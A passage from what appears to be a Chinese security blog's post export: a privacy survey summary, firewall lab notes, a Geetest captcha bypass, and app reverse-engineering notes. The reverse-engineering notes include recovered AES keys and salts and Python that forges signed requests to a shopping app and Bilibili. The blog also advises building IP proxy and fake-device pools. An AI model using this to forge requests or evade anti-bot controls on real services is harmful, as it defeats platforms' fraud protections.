party.\nLDP has the potential to guarantee the data privacy in IoV, the third party does not collect the exact data of each individual, and yet still be able to compute the correct statistical results.\nContributions of this paper:\n first to survey existing work about LDP in terms of advantages, disadvantages, computation complexity, and the privacy budget first to investigate the potential applications of LDP in securing IoV and highlight the new challenges  LDP researches Data publication Data publication based on local differential privacy mainly uses non-interactive framework to release statistical information of sensitive data and enables the released data to meet the needs of data analysis at the same time. Commonly used data publication technologies mainly include histogram, partitioning, and sampling filter.\nThe earliest research RAPPOR proposed to collect crowd-sourced statistics from users’ data without violating users’ data privacy, but it has two disadvantages:\n high communication cost between users and the data collector data collector is required to collect candidate string lists in advance for frequency statistics  To reduce the communication overhead, S-Hist proposed to randomly select bits using randomized response techniques to perturb users’ data and send the perturbed data to the collector.\nTo deal with the second drawback of RAPPOR, the second drawback of RAPPOR, O-RAPPOR based on the unknown values of variables and designed hash mapping and grouping operations.\nMachine Learning The main idea of LDP-based machine learning is that users locally perturb parameter updates of machine learning on their vehicle data using LDP and the server gets the global parameter updates via collecting local parameter updates from users.\nRegression analysis based on LDP is another research topic. Regression analysisis a commonly used data classification method in machine learning, which determines the quantitative relationship of two or more attributes in the input datasets. Regression analysis consists of two kinds of functions: One is the prediction function; the other is the objective function, or the risk function. It will leak the prediction function and the data information in the datasets when publishing the weight vector. To protect such data privacy in machine learning, a variety of work has applied LDP to regression analysis.\nWhether add noise to weight vector or objective function, the cost of calculating the sensitivity of the weight vector is still high.\nTo address the problems above, FM (functional mechanism) was proposed, which achieved the regression analysis while meeting local differential privacy. FM first perturbed the sum of objective functions corresponding to each data tuple in the datasets and then obtained the weight vector by minimizing the target function. In this process, the noise scale is not determined by the sensitivity of the weight vector, but by expressing the objective function as a polynomial, avoiding the computation of the sensitivity of the weight vector.\nIn summary, the SVM classification based on Laplace has low classification accuracy and larger noise, while SVM classification based on perturbing objective functions is only applicable to specific objective functions. Therefore, how to design a perturbation mechanism with high precision and applications to multiple objective functions is the future research topic.\nQuery processing The query processing technologies based on local differential privacy mainly focus on how to respond to queries with less privacy budget and lower error.\nFor example, linear queries in the interactive framework, batch processing of linear queries includes matrix mechanisms and low-rank mechanisms.\nAnother kind of work focused on process users’ queries based on division methods.\nIn summary, the matrix mechanism is prone to suboptimal results in practice; the low-rank mechanism only considers the correlation of the load matrix and does not take into account the relevance of the data itself. Therefore, how to design a general batch query processing mechanism from the actual relevance of the data itself is a future research direction.\nApplication of LDP system Frank et al. first introduced the local differential privacy method to the recommendation system. They assumed that the recommendation system is not trusted. The attacker can estimate the user’s private information by analyzing the historical data of the recommendation system. So it is necessary to interfere with the input of the recommended system. When analyzing the relationship between projects, they first establish a project similarity covariance matrix and add Laplace noise to the matrix to implement interference, and then submit it to the recommendation system to implement the conventional recommendation algorithm.\nApplications of LDP in IoV We first introduce the attack models in IoV and then investigate the potential applications of LDP in several typical scenarios in IoV.\nAttack model in IoV   Malicious vehicle. On the one hand, they may deliberately disclose vehicles’ data to advertisers, illegal organizations. On the other hand, they may collude with others, send poisoning data, deliberately drop out during the process of completing IoV services, etc., aiming to disclosing other users’ data privacy or paralyzing the IoV systems.\n  Malicious server. Specifically, malicious server may be passive or active adversary. The passive adversary is curious about users’ data, but it honestly performs the protocols. In contrast, the active adversary may tamper the protocols or actively launch attacks to disclose users’ data privacy.\n  Query services in IoV A number of techniques have been proposed to protect users’ data privacy in academia.\nSpecifically, rule protocol-based privacy-preserving techniques are first proposed. However, it is high overhead for server to obtain vehicles’ authorization before utilizing vehicles’ data in IoV, because of the unique features vehicles exhibit, e.g., high mobility, short connection times, etc.\nEncryption techniques allow the server to collect and process the encrypted data of vehicles. Nevertheless, it is not applicable to large amounts of vehicles’ data due to the extremely high computation overhead.\nHeuristic algorithms, e.g., dummy, k-anonymity, pseudonym, cloaking, m-invariance, etc., are quite lightweight compared to encryption techniques. But all these heuristic algorithms are vulnerable to the side information-based attacks.\nIn summary, LDP that is relatively lightweight and thoroughly considers side information of attackers is promised to protect vehicles’ data privacy in query services in IoV.\nCrowdsourcing in IoV Many existing work has focused on protecting data privacy in crowdsourcing. Work [114] introduces a third party, the cloud, that is responsible for storage and computation burden. Study [115] proposed a general feedback-based k-anonymity scheme to cloak users’ data. The literature [116] utilized a random perturbation to mask users’ data and employed the error-correcting codes to guarantee data utility. However, all these existing work ignores the side information of attackers and therefore is susceptible to side information-based attacks. Furthermore, these work is not applicable to the data privacy preservation in IoV, as density of vehicles is varying, and vehicles move with high speed and can only be connected in short time.\nIn such a case, LDP is applicable to protect vehicle users’ data privacy in crowdsourcing applications in IoV, as it thoroughly considers the available side information of attackers and is a lightweight privacy-preserving method.\nFuture research opportunities In IoV, the complexity, diversity, and large-scale nature of vehicle data will add new data privacy risks. Therefore, we believe that LDP will face many new challenges：\n LDP for complex data types in IoV. At present, the research of LDP mainly focused on simple data types, e.g., frequency statistics or mean value statistics on set-valued data that only contains one attribute. However, in IoV, the structural characteristics of vehicle data make the global query sensitivity extremely high and bring in excessive noise. LDP for various query and analysis tasks in IoV. At present, the existing work about LDP only investigated the privacy preservation in the two types of simple aggregate queries, i.e., counting queries of the discrete data and mean queries of the continuous data. Furthermore, the way of data perturbation is generally depended on the types of queries. In IoV, a variety of query services are provided, and thus, LDP faces many new challenges. High-dimensional vehicle data publication based on LDP. In IoV, the set-valued data contains many attributes, and the existing studies about LDP will not work, as they only focused on simple data types. Improvements in the LDP model for IoV. In practice, the value of the privacy-preserving parameter 휖 still does not have a standard. Although the physical meaning of parameters in k-anonymity and l-diversity is intuitive, the privacy preservation provided by 휖-differential privacy is relatively vague, which indicates that the problem is still up in the air. Considering correlations among vehicle data with LDP. Local differential privacy assumes that vehicle data are independent of each other, i.e., ignoring the correlations among vehicle data. However, in practice, vehicle data may be dependent. Combinations the LDP model with other techniques, e.g., machine learning, AI, and so on. AI techniques are expected to provide potential solutions to, e.g., smart city, intelligent transportation, travel route recommendation, environment monitoring, air quality navigation, map navigation, etc., in IoV.  ","date":"2022-01-13T21:20:48+08:00","permalink":"https://chinggg.github.io/post/ldp-iov/","tags":["论文","安全"],"title":"LDP IoV"},{"categories":["安全"],"contents":"SEED Labs 2.0 - Network Security Firewall 使用 NetFilter 自制防火墙 LKM Netfilter 是 Linux 内核中一个用于管理网络数据包的软件框架，可以使用它自制 Linux Kernel Module，实现简易的防火墙。\nTask1 只是练习如何编译内核模块，即在 module_init(fn), module_exit(fn) 处初始化及退出。\n使用 Netfilter 搭建防火墙的步骤：\n 定义 nf_hook_ops 结构体，给 hook(hook函数) 和 hooknum(hook点类型) 赋值  struct nf_hook_ops { /* User fills in from here down. */ nf_hookfn\t*hook; struct net_device\t*dev; void\t*priv; u8\tpf; enum nf_hook_ops_type\thook_ops_type:8; unsigned int\thooknum; /* Hooks are ordered in ascending priority. */ int\tpriority; };    模块加载时 nf_register_net_hook(\u0026amp;init_net, \u0026amp;hook1)，卸载时 nf_unregister_net_hook(\u0026amp;init_net, \u0026amp;hook1)\n  nf_hookfn 函数签名如下，实验中只需 ip_hdr(skb) 获得 iphdr 结构体（类似有 tcphdr/udphdr），再从 iph 获得协议类型、源/目标地址，从 tcph/udph 获得端口号，比较决定是否 DROP 即可。\n  typedef unsigned int nf_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);   注意每个结构体只能赋值一个 hooknum，想在多个点上 hook 需定义多个 nf_hook_ops，分别设置不同的 hooknum，枚举类型如下：  enum nf_inet_hooks { NF_INET_PRE_ROUTING, NF_INET_LOCAL_IN, NF_INET_FORWARD, NF_INET_LOCAL_OUT, NF_INET_POST_ROUTING, NF_INET_NUMHOOKS, NF_INET_INGRESS = NF_INET_NUMHOOKS, };  使用 iptables 基本命令 iptables -A {chain} -j {rule}，-i/o {dev} 指定入/出接口，-s/d 指定源/目标地址，-sport/dport 指定源/目标端口\n对于 TCP 连接，使用 conntrack 模块搭建有状态防火墙，只允许已经建立的 TCP 连接和内部发起新连接\n限流使用 limit 模块，--limit 指定设置最大频率（即如10次/分钟），--limit-burst 指定最大连续次数\n负载均衡使用 statistic 模块，--mode 指定模式为 random 或 nth，random 模式下 --probability 指定概率，nth 模式下 --every n 指定轮转周期，--packet p 指定初始计数值（即从[0,n-1]中某处开始计数），一般配合 -j DNAT --to-destination {ip:port} 使用\nVPN_Tunnel 实验基于 TUN/TAP 技术，TUN 模拟网络层设备，TAP 模拟数据链路层设备，用户程序和操作系统可以通过 TUN/TAP 接口互相传递数据包。\nClient Program send(ip) -\u0026gt; Client TUN read(ip) -\u0026gt; Client Socket send(udp/ip) -\u0026gt; Server Socket recv(udp/ip) -\u0026gt; Server TUN write(ip) -\u0026gt; ... route to dst then got reply routed back ... Server TUN read(ip) -\u0026gt; Server Socket send(udp/ip) -\u0026gt; Client Socket recv(udp/ip) -\u0026gt; Client TUN write(ip) -\u0026gt; Client Program recv(ip)  参考文献  https://arthurchiao.art/blog/deep-dive-into-iptables-and-netfilter-arch-zh/ ","date":"2022-01-07T20:57:24+08:00","permalink":"https://chinggg.github.io/post/seed-network/","tags":["实验"],"title":"SEEDLab Network"},{"categories":["安全"],"contents":"小试牛刀 先尝试模拟，使用 puppteer 稍加计算就能成功绕过极验\n请求依次为\n POST https://passport.bilibili.com/x/passport-login/sms/send 设备信息为 body，返回 recaptcha_url 随即向其发起请求，注意该 url 中的 gt 和 challenge 将用于后续一系列请求 GET https://www.bilibili.com/h5/project-msg-auth/verify?ct=geetest\u0026amp;recaptcha_token=\u0026amp;gee_gt=\u0026amp;gee_challenge=\u0026amp;hash= 即向之前获得的 recaptcha_url 发送 GET 请求跳转到页面 GET https://api.geetest.com/gettype.php?gt=\u0026amp;callback=geetest_{13位毫秒时间戳} 返回一些配置参数如静态js文件的位置（即相对路径） GET https://api.geetest.com/get.php?gt=\u0026amp;challenge=\u0026amp;lang=zh-cn\u0026amp;pt=3\u0026amp;client_type=web_mobile\u0026amp;w={一长串}\u0026amp;callback= 仍然返回一些配置如验证开始前显示的i18n字符串 GET https://api.geetest.com/ajax.php?gt=\u0026amp;challenge=\u0026amp;lang=zh-cn\u0026amp;pt=3\u0026amp;client_type=web_mobile\u0026amp;w=\u0026amp;callback= 第一次请求 ajax.php，返回 callback值({\u0026quot;status\u0026quot;: \u0026quot;success\u0026quot;, \u0026quot;data\u0026quot;: {\u0026quot;result\u0026quot;: \u0026quot;slide\u0026quot;}}) GET https://api.geetest.com/get.php 此时刚加载了 slide.js，和第一次请求 get.php 相比多了一些 params 如 is_next=true\u0026amp;type=slide3，返回结果中有滑块验证时会显示的i18n字符串，以及滑块和图片的位置 GET https://api.geetest.com/ajax.php?gt=\u0026amp;challenge=\u0026amp;lang=zh-cn\u0026amp;%24_BBF=3\u0026amp;client_type=web_mobile\u0026amp;w=\u0026amp;callback= 最终的请求，返回 success 及 score  工程化探索 将验证码填充作为通用服务运行，让爬虫客户端无感绕过验证码，考虑在客户端和服务端（比如 puppeteer）之间使用 RPC，客户端先调起服务端，服务端进入验证码流程，但将所有请求拦截并通过 RPC 传递给客户端，客户端代为请求，响应结果作为 RPC 的返回值，服务端再强行将其作为响应，继续之后的动作，从而在验证方看来客户端正常完成了验证。\n真正开发过程中，很多时间浪费在了数据类型造成的错误中，在 proto 中我把除状态码外的所有字段定为 string，但用 axios 等库发起请求时，header 为 object，且若不在请求时指定 responseType，所获响应默认用 json 解析成 object，否则才是 text。更坑的是图片等二进制数据，获得为文本时已经铸成大错，需要先指定 responseType 为 arraybuffer（在 Node 中 blob 实际还是以文本返回，因为 blob 是 browser only），然后 res.data.toString('base64') 转成 base64 字符串通过 RPC 传递，接收方再 Buffer.from(str, 'base64') 来转成 buffer。\nJS逆向：AST还原极验混淆JS实战\n反符号混淆和控制流平坦化\n","date":"2021-12-24T16:27:26+08:00","permalink":"https://chinggg.github.io/post/captcha/","tags":["逆向"],"title":"验证码实战"},{"categories":["安全"],"contents":"App 逆向基础 国产应用大多热衷于构筑自己的 App 围墙，很多功能没有网页版，也就无法利用浏览器一探究竟，不过我们仍然可以通过抓包、静态分析、动态调试的方法解开隐藏在 App 中的秘密。\n抓包能让我们快速获得想要的 API，不过其门槛也在不断增高，Android 7.0 之后应用不再相信非系统证书，客户端应用也可能使用 SSL Pinning 等技术防止中间人的干扰，一般用 Xposed 模块 JustTrustMe 或 TrustMeAlready 可以解决，某些关键请求可能还需额外 hook，可以为其专门定制 Xposed 模块。\n抓包获得关键请求后，分析其字段的意义，并在静态分析工具中全局搜索，定位至相关函数，应用大多会将数据编码、加密或生成摘要，这些逻辑可能放在 native 层实现，增大了逆向的难度。\n所幸 frida 等工具的出现大大便利了动态调试，可以方便地 hook 得到 Java 层各个类及其成员、方法，对于 native 层，也可在获得函数的参数和返回值，快速验证逆向分析时的想法。若由于时机等原因难以 hook，还可直接将 so 库封装到自己创建的 app 中，在 build.gradle 里添加 abiFilters 参数以指定 arm 指令集，手动复制关键类并 import，再在 MainActivity 里 loadLibrary，即可直接调用 native 层方法，调试并在断点之间 hook 更改 context 寄存器的值，查看变量的值。\n逆向得到加密数据、生成校验的算法后，便可以伪造合法的请求。编码上的细节需要多加考虑，抓包得到 params 或 body 中的参数大都是 urlencode 后的结果，但生成校验时的参数却可能是原始的字符串，构造请求时要头脑清醒。排查错误时要冷静，关键位置往往是正确的，但完全没料到的地方可能出岔子，比如谁能想到 f-string 中嵌入 bytes 型的参数，不会报错，生成的字符串里居然还带着引号，而且作为 body 发送居然看上去一模一样？\nbstr = b'feiwu' fstr = f'woshi {bstr}' print(fstr) # woshi b'feiwu'  不能以脚本小子的心态写脚本，必须做好代码的类型标注，模块化编程，这样即使无法避免问题的发生，也能在问题出现时快速定位。排查问题时脑子注意转过弯来，如果加密算法中有随机值，先固定下来，在静态的层面上观察结果，与真实样本做对比。\n实战案例复盘 某品会 edata 参数(AES 加密)\n仅有少量请求有 edata 参数，从一串 query params 型的键值对字符串，得到 AES 加密并 base64 编码后的 edata 结果，具体实现在 esNav 这个 native 函数中。\n首先静态分析，IDA 反编译后两百多行，一上来就从全局变量中获取了未知的字符串，然后放入不知所云的 gsigds 函数中进行一通操作。此时盲目扎进细节中耗时耗力而且白费功夫，只需抓住 AES 加密的核心，无非是 key 和 iv，倒过来分析代码发现前者是 md5 后的值，后者是随机的16位 hex 字符串，生成 edata 的前十六位字符便是 iv，后面再拼接 AES 加密的结果，这样服务器获得发送过来的 edata 后即可对称解密，而 key 显然应该是每次固定的，所以只需 hook 生成 md5 的函数获得返回值，便能得到 key 进而实现加密算法。\n但在测试手机上发现该应用在运行时 hook 容易崩溃，只能以 spawn 的形式 hook， 而抓包发现 edata 的请求似乎只在初始化时发送，刚启动时 native 层中的关键函数又尚未被加载，很难有合适的时机 hook，这时就可以自制 App 直接调用 Java 层函数，在断点之间 hook 即可拿到 key。\n某品会 api_sign 验证头(SHA1 摘要)\n每一个请求头都会带上 Authorization: OAuth api_sign={}，全局搜索定位到 native 函数 gsNav，是从 TreeMap\u0026lt;String, String\u0026gt;(也就是 query params) 得到一串 SHA1 摘要。\n进 IDA 分析，发现仍然调用了 gsigds 函数获取字符串，传入 getByteHash 获得了32位的 hex 字符串作为盐，拼接在从 Map 转成的 query param 型字符串前进行 SHA1 摘要，再对结果再来一次加盐摘要即得 api_sign，实际上如果熟悉 SHA1 的话看到 api_sign 是长为40的 hex 应该就能想到。\nimport base6 import hashlib import json import random from urllib.parse import unquote, parse_qsl, urlencode from Crypto.Cipher import AES from Crypto.Util.Padding import pad def gen_sign(paramstr: str) -\u0026gt; str: \u0026quot;\u0026quot;\u0026quot;paramstr will unquoted automatically\u0026quot;\u0026quot;\u0026quot; paramstr = unquote(paramstr).encode() salt = b\u0026quot;da19a1b93059ff3609fc1ed2e04b0141\u0026quot; # True salt = b\u0026quot;aee4c425dbb2288b80c71347cc37d04b\u0026quot; # False h1 = hashlib.sha1(salt + paramstr) cipher1 = h1.hexdigest().encode() h2 = hashlib.sha1(salt + cipher1) return h2.hexdigest() def gen_edata(paramstr: str) -\u0026gt; str: \u0026quot;\u0026quot;\u0026quot;paramstr: app_name=...\u0026amp;dinfo=...\u0026quot;\u0026quot;\u0026quot; paramstr = paramstr.encode() paramstr = pad(paramstr, 16) key = bytearray.fromhex(\u0026quot;8c c7 03 f6 47 8e 58 f0 84 49 d5 c0 cf 2d d5 83\u0026quot;) # True key = bytearray.fromhex(\u0026quot;cd d1 7a b2 9b 84 b3 25 52 dd cf bb 4a bf 02 25\u0026quot;) # False key = bytes(key) ran16b = ''.join(random.choices('0123456789abcdef', k=16)).encode() cipher = AES.new(key, AES.MODE_CBC, iv=ran16b) enctext = cipher.encrypt(paramstr) ans = base64.b64encode(ran16b + enctext) return ans.decode() def dec_edata(b64s: str) -\u0026gt; str: enctext = base64.b64decode(b64s.encode()) key = bytearray.fromhex(\u0026quot;8c c7 03 f6 47 8e 58 f0 84 49 d5 c0 cf 2d d5 83\u0026quot;) # True key = bytearray.fromhex(\u0026quot;cd d1 7a b2 9b 84 b3 25 52 dd cf bb 4a bf 02 25\u0026quot;) # False key = bytes(key) iv = enctext[:16] cipher = AES.new(key, AES.MODE_CBC, iv=iv) raw = cipher.decrypt(enctext[16:]) try: return raw.decode() except: return raw  某物 app so newSign 参数分析\n常规抓包只能看见小部分请求，检索 NO_PROXY，发现 okhttp3.OkHttpClient$Builder.proxy 处可以 hook，果然 hook 后才可抓到关键请求如 /api/v1/app/search/ice/search/list，检索该 URL 果然在 com.XXX.common.base.delegate.tasks.net.ApiConfigCons 中发现了 BLACK_LIST 这一个黑名单集合。\n搜索请求中的 newSign 字段，发现 WebRequestInterceptor.intercept 会给请求附上 newSign， 其值为 RequestUtils.c(hashMap, timestamp) 的结果，c 这个方法就是在 map 中再补充一些键值对，然后生成按字典序拼接 kv 得到的字符串，传进 AESEncrypt.encode(context, str) 方法，返回值再套一层 f 方法（即 md5）即为最终的 newSign。关键是 AESEncrypt.encode 这个方法里调了 NCall.IL() 这个 Native 函数，然而在 libGameVMP.so 中却无法继续跟踪，用 frida dump 出的 so 不再显示格式错误，但仍然找不到 IL 这个函数。\n模拟 Bili Android 客户端\nYmlsaWJpbGk= app分析\nNative逆向指北(一)——BiliBili Sign\ncom.bilibili.lib.accounts.BiliAuthService 列出了登录相关 API，com.bilibili.lib.accounts.a implements com.bilibili.okretro.interceptor.DefaultRequestInterceptor 会给这些请求 addCommonParam，并在最后附加 sign([0-9a-f]{32})，注意 a 重写了 DefaultRequestInterceptor 的方法，不要 hook 错成后者。\nstatistics={\u0026quot;appId\u0026quot;:1,\u0026quot;platform\u0026quot;:3,\u0026quot;version\u0026quot;:\u0026quot;6.54.0\u0026quot;,\u0026quot;abtest\u0026quot;:\u0026quot;\u0026quot;} qdic_base = {'appkey': '783bbb7264451d82', 'build': '6540300', 'buvid': '^XY[A-F0-9]{35}', 'c_locale': 'zh-Hans_CN', 'channel': 'bili', 'mobi_app': 'android', 'platform': 'android', 's_locale': 'zh-Hans_CN', 'statistics': json.dumps(statistics, separators=(',', ':'))}  以上参数是所有请求的 base query，可固定在配置文件中，这样针对特定请求仅需添加 extra query 即可\n其中 buvid 跟到 com.bilibili.lib.blkv.internal.kv.KVs.getString(\u0026quot;buvid\u0026quot;, \u0026quot;\u0026quot;)，因为自行实现的 KV 存储，但有 getString 就会有 putString，直接 hook java.util.HashMap 的 put 方法，最早 put buvid_local 是在 com.bilibili.lib.biliid.api.c.b.a 这个方法中，而该方法里调用了 interface w1.g.x.g.a 的 a 方法得到字符串，无法直接跳转，找 interface 的实现，最终在 w1.g.x.g.d.b 中生成字符串，传入参数是 interface w1.g.x.g.b 类型，依次调用其 c, d, a, b 方法，获得非空字符串则进行操作直接返回，静态跟入太烦，直接 hook 该参数打印四个方法所得字符串，发现就生成 buvid 而言，c 为空，d 为 MAC 地址，则直接对 MAC 地址进行相应 md5 操作即可，验证结果一致。\nsign 的生成在 com.bilibili.nativelibrary.LibBili.signQuery(Map\u0026lt;String, String\u0026gt;)，实际调用 native 函数 s，但其在 libbili.so 中是动态注册的，考虑编写 Xposed 模块主动调用\n[RegisterNatives] java_class: com.bilibili.nativelibrary.LibBili name: s sig: (Ljava/util/SortedMap;)Lcom/bilibili/nativelibrary/SignedQuery; fnPtr: 0xc13138e9 fnOffset: 0x68e9 callee: 0xc1313303 libbili.so!JNI_OnLoad+0x14e  public String genSQ(Map\u0026lt;String, String\u0026gt; map) { try { Class cls = XposedHelpers.findClass(\u0026quot;com.bilibili.lib.accounts.a\u0026quot;, g_classLoader); Object ins = XposedHelpers.newInstance(cls); Object res = XposedHelpers.callMethod(ins, \u0026quot;signQuery\u0026quot;, map); return res.toString(); } catch (Exception e) { e.printStackTrace(); Log.e(TAG, map.toString() + \u0026quot; \u0026quot; + g_classLoader.toString()); } return \u0026quot;\u0026quot;; }  登录界面输完手机号，点击发送短信验证码会向 https://passport.bilibili.com/x/passport-login/sms/send 发起请求，除了用户控制的 cid 和 tel 该请求还需附带 login_session_id 和 device_tourist_id，不难逆得前者 buvid 拼接毫秒 timestamp 再 md5 得到长为16的 hex 字符串，后者实际键名为 guest_id，应用初始化时向 https://passport.bilibili.com/x/passport-user/guest/reg 发请求拿到，而该请求又要附带 dt 和 device_info 两个参数。\n接着 hook 对应函数和 HashMap 键值，得到关键类 com.bilibili.lib.accounts.BiliPassportApi 和方法 l,k,j，其中 l 创建了一个 kotlin Function，依次传到 j 中再 invoke，hook com.bilibili.lib.accounts.BiliPassportApi$getGuestID$1(这是一个 Function) 的构造方法即可看到传入的 HashMap 在 com.bilibili.lib.accounts.e.a 中生成\n{ \u0026quot;AndroidID\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;BuildBrand\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;BuildDisplay\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;BuildFingerprint\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;BuildHost\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;Buvid\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;DeviceType\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;MAC\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;fts\u0026quot;: \u0026quot;\u0026quot; }  invoke 返回 JSONString，getBytes 传入 com.bilibili.lib.accounts.n.c c，c 返回 Pair\u0026lt;随机[A-Z][a-z][0-9]{16}字符串, 长为bytes两倍的HEX字符串\u0026gt;，前者作为 AES/CBC/PKCS5Padding 的 key 和 IV 加密 JSONString 转成的 bytes，后者是 AES 加密后的 bytes 转成 HEX。然后再调用 com.bilibili.lib.accounts.model.AuthKey encrypt 对前者做 RSA/ECB/PKCS5PADDING 公钥加密并 b64encode，最后前者为 dt，后者即为 device_info 发送。RSA 的公钥又从哪来？https://passport.bilibili.com/x/passport-login/web/key 即得，因为不变动所以直接存为常量，注意加密时掐头去尾了。那么对方后端接收到 dt 后先 b64decode 再用私钥解密，即得 AES 的 key，然后即可解密 device_info\nsms/send 只是短信登录的一半，该请求返回非空字符串 recaptcha_url 或 captcha_key，若为前者则需先完成极验滑动验证码才能继续登录流程，后者则直接发送了验证码，带上 captcha_key 和短信接收到的 code 向 login/sms 发 POST 请求即可完成登录，返回 JSON 数据，包含关键信息如 mid（即用户 id）和 access_token（附加在后续请求头 authorization 中）\n密码登录 https://passport.bilibili.com/x/passport-login/oauth2/login，明文密码前拼接上 web/key 得到的 hash，做 RSA/ECB/PKCS5PADDING 公钥加密并 b64encode，dt 和 device_meta 组合仍然是一对，前者是 RSA 加密过的 AES 密钥，后者是 Function0 BiliPassportApi$loginV3$1 invoke() 后返回的 JSONString 做 AES 加密的 HEX 结果。返回 message 可能为 验证码错误 或 账号存在风险需使用手机号验证，前者则 url 为 h5 验证码，后者则 url 为短信验证码（点击发送前仍会弹出验证码），\n琐碎的参数看的人头晕眼花，本质都是设备指纹（FingerPrint，缩写为fp），注意常见\n接着看私信，抓包得 https://app.bilibili.com/bilibili.im.interface.v1.ImInterface/，发私信即 SendMsg，实测重放请求就能收到多条信息，有意思的是 Content-Type: application/grpc，看到这个就该想到直接找 protobuf 定义了，但初遇没经验还是在 Java 层抽丝剥茧，com.bapis.bilibili.im.interfaces.v1.ReqSendMsg，一路追溯确实能精准定位到方法 w1.g.h.d.b.b.i.t0.R 初次返回了具有附带足够信息的 Message，但对于这种场景，与其挖空心思跟踪客户端层面数据是如何生成的，不如直接从最终请求的层次上搞清数据是什么。\n工程化知识沉淀 抓包阶段：\n要抓总能抓到，熟练使用趁手的软件\n注意数据的呈现格式，以 Fiddler 为例， WebForms 栏中展示的是 urldecode 后的结果，而 TextView 和 SyntaxView 才是原始格式，对于 Content-Type: application/x-www-form-urlencoded 的 POST 请求亦是如此\n分析请求中的基础参数，迅速导出为 JSON 备用\n逆向阶段：\n动静结合，静态查找 URL 或参数名称，从网络请求跟进到数据获取一般比较直接，但异步数据何时生成，由何生成可能难以看出，可以动态 hook 数据获取的函数以及 HashMap SharedPreference 等存取键值的函数，在打印的调用栈上获得下一步静态分析的目标，以此往复。\n有时会看到新的语言特性，JADX 无法将 kotlin.jvm.functions.Function0 还原为类，而 GDA 做的就比较好\n解密阶段：\n区分字符串在 bytes 和 字符编码层面的表示，熟练转换 json, str, bytes, hexstring, bytearray\n理解对称加密、非对称加密、摘要算法各自的特点和用途，熟知 MD5, AES, RSA 在 Java 与 Python 库中的实现，知道 PKCS5 与 PKCS7 的异同 常见流程：生成 [A-Z][a-z][0-9]{16} 的随机字符串，作为 AES 的 (128bit) Key 或 IV，对 bytes 明文进行加密，然后 AES Key 又用 RSA 公钥加密，把两者都在请求中发送，服务端用私钥解密得 AES Key，然后再 AES 解密明文。\n请求阶段：\nfrom urllib.parse import parse_qsl, quote, urlencode 熟练使用网络请求库，如 requests.post 如果 data 为字符串，Content-Type 默认为空，服务端预期为 application/x-www-form-urlencoded，故而会返回错误\n使用 Sekiro 快速搭建主动调用加密函数的 API\nAndroid逆向之无加固下的Java层和Native层模拟的调度解决方案\n池化阶段：\n打造批量 IP 代理池、伪造设备池，熟悉各种设备指纹\n参考文献 https://pitechan.com/爬虫工程师的自我修养之基础模块/\nhttps://curz0n.github.io/2021/05/10/android-so-reverse/\n主流安卓APP反作弊及反反作弊的一些思路和经验汇总\n","date":"2021-11-30T14:36:28+08:00","permalink":"https://chinggg.github.io/post/appre/","tags":["逆向"],"title":"AppRE"},{"categories":["记录"],"contents":"用上 Btrfs 不到两个月，还没怎么享受透明压缩和增量快照带来的好处，却已为它熬过几个艰难的夜晚\n先是 WinBtrfs 的问题，btrfs check --repair 幸运地修回来，果断注册表里改成只读\n但之后在 Arch 中作死用 VMWare 从物理磁盘启动自身，却造成了毁灭性后果，整个系统突然变为 ro，重启后果然 transid error 无法进入\n老规矩先抢救数据， restore 到 ext4 格式的移动硬盘（exFAT 真没用）\n这次虽然 transid 只差了 1，但 check 后发现问题比上次更为严重，check -b, check -s 1 结果都不妙\n记下 btrfs-find-root 的结果以备之后 repair\n但可惜 repair 也无能为力，可能还让事情更糟了，试了 rescue zero-log 也没救回\n神奇的是进 Win 还能正常识别文件，也不知道是 repair 还是 rescue 让 btrfs 分区能直接挂载了\n现在问题变成了 EIO，理论上是盘坏了但它肯定没坏，数据都还能读但无法恢复正常\n没办法，趁还可以挂载 btrfs 分区，rsync -aviHAXKhP 再备份一遍到移动硬盘（注意 exclude 快照和无用大目录，否则等一晚上）\n把 btrfs 分区格了再从移动硬盘拖回去，子卷化，改 fstab，重做 grub 引导，终于进入了熟悉的 Arch\n然而用户配置等方面还是有问题，可能第二回的备份不全，把之前备份的配置覆盖回去。pacman 还有数据不一致问题，overwrite 解决\n","date":"2021-11-28T20:50:22+08:00","permalink":"https://chinggg.github.io/post/btrfs/","tags":["环境配置","长期"],"title":"Btrfs 踩坑记录"},{"categories":["安全"],"contents":"Frida 万金油动态调试工具，配合自己收集定制的 hook 模板代码，稍作修改就可以快速查看 Java 层的类及其方法成员信息和 Native 层函数的参数与返回值，便于验证自己的想法，但实际上手可能还会遇到不少坑点令人苦恼：\n Java/Native 层数据结构映射到 JS 这种动态语言，可能需要 cast 或者自己转换成 JS 中的类型 Native 层通过 findExportByName 获取函数不够准确，可能还要通过地址 不应发生的 cannot access address \u0026hellip; 问题  https://www.anquanke.com/post/id/195869\nhttps://kevinspider.github.io/fridahookjava/\nhttps://kevinspider.github.io/fridahookso/\nhttps://kevinspider.github.io/zhuabao/\nhttps://eternalsakura13.com/2020/07/04/frida/\nhttps://github.com/lasting-yang/frida_dump/\nhttp://www.juziss.cn/2020/07/11/彻底搞定Hook不上/\nfunction map2obj(map) { var res = {}; var keyset = map.keySet(); var it = keyset.iterator(); while (it.hasNext()) { var keystr = it.next().toString(); var valuestr = map.get(keystr).toString(); res[keystr] = valuestr } return res; } function body2str(reqBody) { const Buffer = Java.classFactory.use(\u0026quot;okio.Buffer\u0026quot;); const buf = Buffer.$new(); reqBody.writeTo(buf); return buf.readUtf8(); return buf.toString(); // only get summary } function printable(variable, type) { if (type.includes(\u0026quot;Map\u0026quot;)) { return JSON.stringify(map2obj(variable), null, 4) return variable.entrySet().toArray() } if (type.includes(\u0026quot;RequestBody\u0026quot;)) { return body2str(variable) } return variable; } function dfs(self, depth) { if (depth \u0026gt; 6) return {} const obj = {} const cls = self.getClass() const fields = cls.getDeclaredFields() // console.log(\u0026quot;-\u0026quot;.repeat(depth), \u0026quot;dfs\u0026quot;, cls, self) // console.log(\u0026quot;-\u0026quot;.repeat(depth), \u0026quot;fields:\u0026quot;, fields) const immediates = ['short', 'int', 'long', 'float', 'double', 'boolean', 'String'] fields.forEach(x =\u0026gt; { x.setAccessible(true) const v = x.get(self) if (v === null) return const s = x.toString() // public type fullname // const type = x.getType() // class java.lang.String // const k = 